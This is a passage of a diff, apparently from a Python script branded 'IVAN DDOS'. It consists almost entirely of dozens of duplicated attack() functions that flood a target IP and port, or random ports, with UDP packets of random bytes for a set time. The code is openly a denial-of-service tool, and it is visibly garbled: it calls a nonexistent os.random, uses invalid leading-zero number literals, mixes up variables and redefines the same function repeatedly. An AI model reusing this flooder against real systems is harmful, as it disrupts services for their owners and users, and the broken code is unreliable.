-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24155,225 +17793,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24749,7 +18169,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24781,7 +18201,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24813,7 +18233,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24845,7 +18265,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24877,7 +18297,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24903,7 +18323,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24935,39 +18355,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -24999,7 +18387,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -25031,415 +18419,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -25471,225 +18451,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
